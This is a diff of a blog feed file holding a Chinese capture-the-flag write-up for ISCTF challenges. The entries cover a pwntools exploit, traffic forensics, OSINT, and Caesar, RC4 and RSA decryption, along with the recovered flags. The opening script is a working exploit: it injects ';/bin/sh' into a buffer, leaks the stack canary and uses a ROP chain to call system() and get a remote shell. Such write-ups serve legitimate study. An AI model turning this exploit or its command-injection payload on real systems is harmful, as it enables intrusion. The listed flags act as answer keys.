+from pwn import *# ================= 配置 =================context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;binary_path = &#x27;./pwn&#x27;elf = ELF(binary_path)# 连接远程p = remote(&#x27;challenge.bluesharkinfo.com&#x27;, 24605)#p = process(&#x27;./pwn&#x27;)# ================= 阶段 1: 埋雷 (注入 Shell 命令) =================log.info(&quot;Step 1: Injecting &#x27;/bin/sh&#x27; into global buffer...&quot;)# 这里的 buf 是全局变量。# 程序处理后会变成 &quot;Hello,;/bin/sh&quot;# system(&quot;Hello,;/bin/sh&quot;) -&gt; 会先报错 &quot;Hello, not found&quot;，然后执行 &quot;/bin/sh&quot;！p.recvuntil(b&quot;input your name&quot;)p.sendline(b&quot;;/bin/sh&quot;) p.recvuntil(b&quot;Press \&quot;Enter\&quot; to start&quot;)p.sendline(b&quot;&quot;)# ================= 阶段 2: 整数下溢 (-10分) =================log.info(&quot;Step 2: Triggering Integer Underflow...&quot;)for i in range(6):    p.recvuntil(b&quot;operation:&quot;)     p.sendline(b&quot;Q&quot;)    p.recvuntil(b&quot;settle and exit&quot;)    if i == 5:        p.sendline(b&quot;Q&quot;)    else:        p.sendline(b&quot;c&quot;)p.recvuntil(b&quot;here is your shell&quot;)p.recvuntil(b&quot;$&quot;)log.success(&quot;Entered Fake Shell!&quot;)# ================= 阶段 3: 泄露 Canary =================log.info(&quot;Step 3: Leaking Canary...&quot;)p.send(b&#x27;a&#x27; * 136 + b&#x27;b&#x27;) p.recvuntil(b&quot;executing command: &quot;)p.recvuntil(b&#x27;b&#x27;)leak = p.recvline(keepends=False)if len(leak) &lt; 7:    log.error(&quot;运气不好，Canary 被截断了。请重新运行脚本！&quot;)    exit()canary = b&#x27;\x00&#x27; + leak[:7]log.success(f&quot;Canary: &#123;hex(u64(canary))&#125;&quot;)# ================= 阶段 4: ROP 攻击 (执行 system(buf)) =================log.info(&quot;Step 4: Executing system(buf)...&quot;)# 1. 查找 gadgets 和地址rop = ROP(elf)pop_rdi = rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0] # 把参数放进 rdi 寄存器ret_gadget = rop.find_gadget([&#x27;ret&#x27;])[0]         # 栈对齐system_plt = elf.plt[&#x27;system&#x27;]                   # system 函数地址global_buf = 0x404a40                            # 全局变量 buf 的地址 (存放了我们的名字)log.info(f&quot;Pop RDI: &#123;hex(pop_rdi)&#125;&quot;)log.info(f&quot;Global Buf: &#123;hex(global_buf)&#125;&quot;)# 2. 构造 Payloadpayload = flat([    b&#x27;exit\x00&#x27;.ljust(136, b&#x27;a&#x27;), # 欺骗 strcmp 退出循环    canary,                       # 还原 Canary    b&#x27;b&#x27; * 8,                     # 填充 RBP    p64(ret_gadget),              # 栈对齐 (防止 system 崩溃)    p64(pop_rdi),                 # ROP: 准备传参    p64(global_buf),              # 参数: &quot;Hello,;/bin/sh&quot; 的地址    p64(system_plt)               # 调用 system])p.send(payload)# ================= 阶段 5: 拿 Shell =================# 发送后，程序会退出 shell()，触发 return，执行 system(&quot;Hello,;/bin/sh&quot;)p.interactive()
+
+
+应急响应hacker用wireshark打开，过滤
+
+http.request.method &#x3D;&#x3D; “POST”
+
+打开上方统计里的会话，看IPV4，选择流量最大的地址，192.168.37.177即flag
+
+奇怪的shell文件其实可以试出来，常用的webshell连接工具一共就这么多。ISCTF{Behinder}
+OSINTONINT1请你识别一下这是哪个地方
+这是位于中国福建省福州市的福州大学（旗山校区）图书馆。
+判断依据：
+建筑特征：
+钟楼：图片左侧高耸的方形钟楼是该图书馆最显著的标志性特征。钟楼设计简洁现代，带有竖向的条形窗和顶部的时钟。
+主体建筑：右侧的主楼采用米黄色&#x2F;灰白色的石材外墙，有着整齐的方形窗格和现代感的柱廊设计。
+广场：建筑前方有一个非常宽阔的铺砖广场，这是福州大学旗山校区图书馆正门前的典型景观。
+红色雕塑&#x2F;墙体：在主入口右侧（台阶旁）有一个红色的波浪形或飘带状的雕塑墙，这通常刻有学校的校训或名称。
+地理环境：
+天空阴沉，地面潮湿，符合福州多雨湿润的气候特征。
+整体建筑风格大气、方正，符合该图书馆作为校园核心地标（曾获中国建筑工程鲁班奖）的地位。
+地点详情：
+名称：福州大学图书馆 (Fuzhou University Library)
+位置：福州大学旗山校区（新校区），位于福州市闽侯县上街镇大学城。
+地位：它是福州大学城的标志性建筑之一，位于校区的中轴线上。
+
+OSINT2这个地方在哪里
+这是一个位于美国纽约曼哈顿的东河滨水大道 (East River Waterfront Esplanade)，具体位置在双桥 (Two Bridges) 社区附近。
+从图片中的视角可以判断：
+左侧的桥梁：是蓝色的曼哈顿大桥 (Manhattan Bridge)。我们可以清晰地看到其标志性的蓝色钢塔。由于桥在左侧且看起来非常高大，这说明拍摄位置就在曼哈顿大桥的南侧附近。
+右侧的桥梁：远处那座带有石塔的桥是布鲁克林大桥 (Brooklyn Bridge)。
+拍摄地点：您位于曼哈顿一侧的东河沿岸，处于两座大桥之间（更靠近曼哈顿大桥）。这里的长椅和栏杆是东河滨水大道（East River Esplanade）翻新工程的一部分（通常由 SHoP Architects 设计），这一带（如 Pier 35 以南到 Market Slip 附近）提供了观赏两座大桥的绝佳视角。
+位置详情：
+地点：东河滨水大道 (East River Waterfront Esplanade)
+区域：曼哈顿下城的双桥社区 (Two Bridges)
+景观：面朝东河 (East River) 和布鲁克林方向
+
+OSINT3
+f12可以看到这个题调用了谷歌地图的API
+https://www.google.com/maps/@?api=1&amp;map_action=pano&amp;pano=-88LYedx_0Bfr0PMqm0OhA
+SignInOSINT-4ISCTF{like.crazy.thursdays}
+
+OSINT-4这是一道典型的**变种凯撒密码（Variant Caesar Cipher）**题目。
+普通的凯撒密码由于偏移量（Shift）是固定的，很容易被破解。而这段代码中的偏移量是动态变化的：
+初始偏移量为 2。
+每处理一个字母，偏移量就会增加 3 (shift +&#x3D; 3)。
+非字母字符（如 {, _, }）不参与加密，且不会改变偏移量。
+解题思路要解出 Flag，我们需要编写一个解密脚本（Decrypt Script），逻辑与加密完全相反：
+加密算法： (原文 + shift) % 26
+解密算法： (密文 - shift) % 26
+Shift 的变化： 必须与加密过程完全一致（初始为 2，每遇到一个字母 +3）。
+解题代码 (Python)你可以直接运行这段 Python 代码来获取 Flag：
+Python
+def variant_caesar_decrypt(ciphertext):    decrypted = &quot;&quot;    shift = 2  # 初始偏移量与加密时保持一致        for char in ciphertext:        if char.isalpha():            # 确定基准值（大写或小写）            if char.isupper():                base = ord(&#x27;A&#x27;)            else:                base = ord(&#x27;a&#x27;)                        # 逆向运算：减去偏移量            # Python 的取模运算 (%) 可以正确处理负数，所以直接减即可            new_char = chr((ord(char) - base - shift) % 26 + base)            decrypted += new_char                        # 偏移量变化规则与加密时完全一致            shift += 3        else:            # 非字母字符直接保留            decrypted += char                return decrypted# 题目给出的密文cipher = &quot;KXKET&#123;Tubsdx_re_hg_zytc_hxq_vnjma&#125;&quot;flag = variant_caesar_decrypt(cipher)print(&quot;解密结果: &quot; + flag)
+运行结果运行上述脚本后，你会得到：
+Flag: ISCTF{Caesar_is_so_easy_and_funny}
+原理解析（手动验算前几位）如果你想理解具体发生了什么，我们可以手动验算前几个字符 KXKET：
+‘K’:
+当前 shift &#x3D; 2
+解密: K (-2) -&gt; I
+新 shift &#x3D; 2 + 3 &#x3D; 5
+‘X’:
+当前 shift &#x3D; 5
+解密: X (-5) -&gt; S
+新 shift &#x3D; 5 + 3 &#x3D; 8
+‘K’:
+当前 shift &#x3D; 8
+解密: K (-8) -&gt; C
+新 shift &#x3D; 8 + 3 &#x3D; 11
+‘E’:
+当前 shift &#x3D; 11
+解密: E (-11) -&gt; T
+新 shift &#x3D; 11 + 3 &#x3D; 14
+‘T’:
+当前 shift &#x3D; 14
+解密: T (-14) -&gt; F
+新 shift &#x3D; 14 + 3 &#x3D; 17
+前缀组合起来就是 ISCTF。
+
+小蓝鲨的RC4系统这道题是典型的 RC4 流密码题目。RC4 是一种对称加密算法，其核心特点是：加密和解密使用完全相同的算法和密钥。即：$明文 \oplus 密钥流 &#x3D; 密文$，反过来 $密文 \oplus 密钥流 &#x3D; 明文$。解题思路密文 (Ciphertext)：你提供的长字符串 ba19a711… 是十六进制格式的密文。密钥 (Key)：通常在 CTF 题目中，如果代码里写了注释 #ISCTF2025，那么 ISCTF2025 很可能就是密钥（Key）。解密方法：将十六进制密文转换为字节（bytes）。使用相同的密钥（ISCTF2025）初始化 StreamCipher。调用 crypt 方法处理密文，即可得到明文（Flag）。解密代码 (Python)你可以直接运行以下代码来获取 Flag：
+import hashlibclass StreamCipher:    def __init__(self, key):        self.S = list(range(256))        self.i = 0        self.j = 0                j = 0        key_bytes = self._key_to_bytes(key)        for i in range(256):            j = (j + self.S[i] + key_bytes[i % len(key_bytes)]) % 256            self.S[i], self.S[j] = self.S[j], self.S[i]        def _key_to_bytes(self, key):        if isinstance(key, str):            # 注意：题目中使用了 sha256 对密钥进行了处理            return hashlib.sha256(key.encode()).digest()        elif isinstance(key, bytes):            return hashlib.sha256(key).digest()        def _prga(self):        self.i = (self.i + 1) % 256        self.j = (self.j + self.S[self.i]) % 256        self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]        K = self.S[(self.S[self.i] + self.S[self.j]) % 256]        return K        def crypt(self, data):        if isinstance(data, str):            data = data.encode(&#x27;utf-8&#x27;)                result = bytearray()        for byte in data:            key_byte = self._prga()            result.append(byte ^ key_byte)                return bytes(result)
+题目提供的密文 hex 字符串hex_ciphertext &#x3D; “ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d”
+猜测密钥为注释中的内容key &#x3D; “ISCTF2025”
+
+将 hex 转换回 bytescipher_bytes &#x3D; bytes.fromhex(hex_ciphertext)
+
+初始化密码器rc4 &#x3D; StreamCipher(key)
+
+解密 (RC4是对称的，再次运行 crypt 即可解密)decrypted_bytes &#x3D; rc4.crypt(cipher_bytes)
+
+打印结果
+
+
+try:    print(&quot;Flag:&quot;, decrypted_bytes.decode(&#x27;utf-8&#x27;))except UnicodeDecodeError:    print(&quot;Decoded raw bytes:&quot;, decrypted_bytes)
+预期结果运行上述脚本后，你应该能得到类似格式的 flag：ISCTF{…} 或者一段有意义的英文句子。关键点解释：题目中的 _key_to_bytes 函数加了一层 SHA256，这意味着无论原本的 key 是多短的字符串，真正用于 RC4 初始化（KSA 阶段）的 key 都是 32 字节的哈希值。解密时必须保留这个逻辑。
+
+小蓝鲨的费马谜题#!/usr/bin/env python3# recover_flag.py# 从 output.txt 中解析 n, e, c 和 hints，然后尝试用 gcd(hint-2, n) 得到因子并解密 flag。import refrom math import gcddef parse_output(path=&quot;output.txt&quot;):    with open(path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        data = f.read()    # parse n, e, c    def parse_var(name, text):        m = re.search(rf&quot;&#123;name&#125;\s*=\s*([0-9]+)&quot;, text)        return int(m.group(1)) if m else None    n = parse_var(&quot;n&quot;, data)    e = parse_var(&quot;e&quot;, data)    c = parse_var(&quot;c&quot;, data)    # parse hints    hints = []    for line in data.splitlines():        m = re.match(r&quot;\s*Hint\s*\d+\s*:\s*([\d]+)\s*,\s*([\d]+)\s*,\s*([0-9]+)\s*&quot;, line)        if m:            a = int(m.group(1)); b = int(m.group(2)); val = int(m.group(3))            hints.append((a,b,val))    return n,e,c,hintsdef recover(n,e,c,hints):    for (a,b,val) in hints:        g = gcd(val - 2, n)        if 1 &lt; g &lt; n:            p = g            q = n // p            print(f&quot;Found factor from hint (&#123;a&#125;,&#123;b&#125;) -&gt; p = &#123;p&#125;&quot;)            print(f&quot;q = &#123;q&#125;&quot;)            phi = (p-1)*(q-1)            d = pow(e, -1, phi)            m = pow(c, d, n)            mb = m.to_bytes((m.bit_length()+7)//8, &quot;big&quot;)            try:                return mb.decode()            except:                return mb    return Noneif __name__ == &quot;__main__&quot;:    n,e,c,hints = parse_output(&quot;output.txt&quot;)    print(f&quot;n: &#123;n.bit_length()&#125; bits, e: &#123;e&#125;, hints: &#123;len(hints)&#125;&quot;)    flag = recover(n,e,c,hints)    if flag:        print(&quot;Recovered flag:&quot;, flag)    else:        print(&quot;未能从任何 hint 中恢复出因子。&quot;)
+
+n: 2048 bits, e: 65537, hints: 50Found factor from hint (11,89) -&gt; p = 123598810108223191678595737123772778844630215064002820305338893427708983045469952403683397913953718120695151358793148813540889659478471330180117646250073161663408336541470953255506590569305918418756769822199023697222924000869451811623347213265980868063025676171788114326810217962087651858127454074427834611547q = 136949111151715308093466138482766128417945922938280535902311316916191224711741075344775882746981169759097204774451483248859410056614176290188278706353514597451090706469947082050645212852942030882665589247416869596191053523701936051581510104172307914090965404623936509038840330635762865076682882876842571351201Recovered flag: ISCTF&#123;M0dIFi3D_f3RM47_7H30r3m_I5_fUn_8U7_h4rD3r!&#125;
+
+
+我去，Flag是真的！？随便交一个即可
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+  </entry>
+  <entry>
     <title></title>
     <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
     <content><![CDATA[]]></content>
